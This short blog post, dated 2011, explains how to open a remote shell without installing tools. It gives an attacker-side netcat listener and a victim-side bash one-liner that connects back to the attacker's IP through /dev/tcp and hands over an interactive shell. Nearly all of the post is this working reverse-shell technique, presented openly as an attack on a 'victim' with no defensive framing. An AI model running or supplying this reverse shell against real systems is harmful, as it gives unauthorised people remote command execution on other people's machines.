+++
title = "remote shell without any tools"
date = "2011-11-25"
slug = "2011/11/25/remote-shell-without-any-tools"
Categories = []
+++

Here's a method for opening up a TCP connection from one host to another without needing to install any tools.

From the attacker machine, wait for a connection

Wait for connections

```bash 
nc -nlp 12345
```

From the victim

Call home

```bash
/bin/bash -i > /dev/tcp/10.10.10.10/12345 0<&1 2>&1
```

The victim code will open up a connection the the attacker, allowing the attacker to run whatever bash commands he wants. All this without installing anything on the victim. Spooky.

